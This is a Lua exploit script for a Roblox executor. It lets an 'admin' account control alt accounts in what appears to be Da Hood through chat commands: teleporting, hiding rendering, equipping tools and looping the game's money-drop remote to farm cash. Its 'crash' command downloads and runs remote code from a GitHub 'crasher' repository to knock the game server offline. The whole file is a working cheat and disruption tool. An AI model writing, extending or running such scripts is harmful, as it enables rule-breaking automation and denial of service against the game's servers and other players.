local admin = getgenv().admin
local prefix = getgenv().prefix
local crasher = getgenv().crasher

local alts = getgenv().alts



local adminpositions = {{-870,-38,-550},{-870,-38,-570},{-870,-38,-590},{-870,-38,-610}}

if not game:IsLoaded() then
    game.Loaded:Wait();
end



local dropping = false
local Players = game:GetService("Players")
local player = Players.LocalPlayer
local Plr = game:GetService("Players").LocalPlayer

local players, replicatedStorage = game:GetService("Players"), game:GetService("ReplicatedStorage");
local defaultChatSystemChatEvents = replicatedStorage:FindFirstChild("DefaultChatSystemChatEvents");

local onMessageDoneFiltering = defaultChatSystemChatEvents:FindFirstChild("OnMessageDoneFiltering");

local chatFrame = player.PlayerGui.Chat.Frame
chatFrame.ChatChannelParentFrame.Visible = true
chatFrame.ChatBarParentFrame.Position = chatFrame.ChatChannelParentFrame.Position+UDim2.new(UDim.new(),chatFrame.ChatChannelParentFrame.Size.Y)

if table.find(alts, player.name) then
game:GetService("RunService"):Set3dRenderingEnabled(false)
setfpscap(fps)
end




local function onChatted(p,msg)
    if player.name==admin then
         if msg:match(prefix.."tpto") then
            local targetPlayer = Players:FindFirstChild(string.split(msg," ")[2])
            Players.LocalPlayer.Character.HumanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame
        end
     return
    end
     
    if p.name==admin then

        if msg == prefix.."drop" then
            dropping = true
            game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Start","All")
        end
        if msg == prefix.."stop" then
            dropping = false
            game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("End","All")
            print("Stopped")
        end
         if msg == prefix.."showscreen" then
            game:GetService("RunService"):Set3dRenderingEnabled(true)
        end
        if msg == prefix.."crash" then
            if player.name == crasher then
                loadstring(game:HttpGet('https://raw.githubusercontent.com/BetterDaHood/BetterDaHoodCrasher/main/Crash'))()
            end
        end
        if msg:match(prefix.."wallet") then
            print(string.split(msg," ")[2])
            if string.split(msg," ")[2] == "show" then
                    if Plr.Backpack:FindFirstChild("Wallet") and Plr.Character:FindFirstChild("Wallet") == nil then
                        local tool = Plr.Backpack:FindFirstChild("Wallet")
                        Plr.Character.Humanoid:EquipTool(tool)
                    end
            end
            if string.split(msg," ")[2] == "hide" then
                    if Plr.Backpack:FindFirstChild("Combat") and Plr.Character:FindFirstChild("Combat") == nil then
                        local tool = Plr.Backpack:FindFirstChild("Combat")
                        Plr.Character.Humanoid:EquipTool(tool)
                    end
            end
        end
        if msg == prefix.."host" then
            print("Moving to admin.")
            local targetPlayer = Players:FindFirstChild(admin)
            Players.LocalPlayer.Character.HumanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame
            player.Character.HumanoidRootPart.Rotation = Vector3.new(0,0,0)
        end
        if msg:match(prefix.."setup") then
            for i, v in ipairs(alts) do
                if v == player.name then
                    player.Character.HumanoidRootPart.CFrame = CFrame.new(adminpositions[i][1],adminpositions[i][2],adminpositions[i][3])
                    player.Character.HumanoidRootPart.Rotation = Vector3.new(0,0,0)
                end
            end
        end

end   
end


for _,p in ipairs(Players:GetPlayers()) do
    p.Chatted:Connect(function(msg) onChatted(p,msg) end)
end

Players.PlayerAdded:Connect(function(p)
    p.Chatted:Connect(function(msg) onChatted(p,msg) end)
end)

onMessageDoneFiltering.OnClientEvent:Connect(function(messageData)
local speaker, message = players[messageData.FromSpeaker], messageData.Message
    onChatted(speaker,message)
end);

while wait() do
    if dropping == true then
        game.ReplicatedStorage.MainEvent:FireServer("DropMoney",10000)
        wait(15)
    end
end
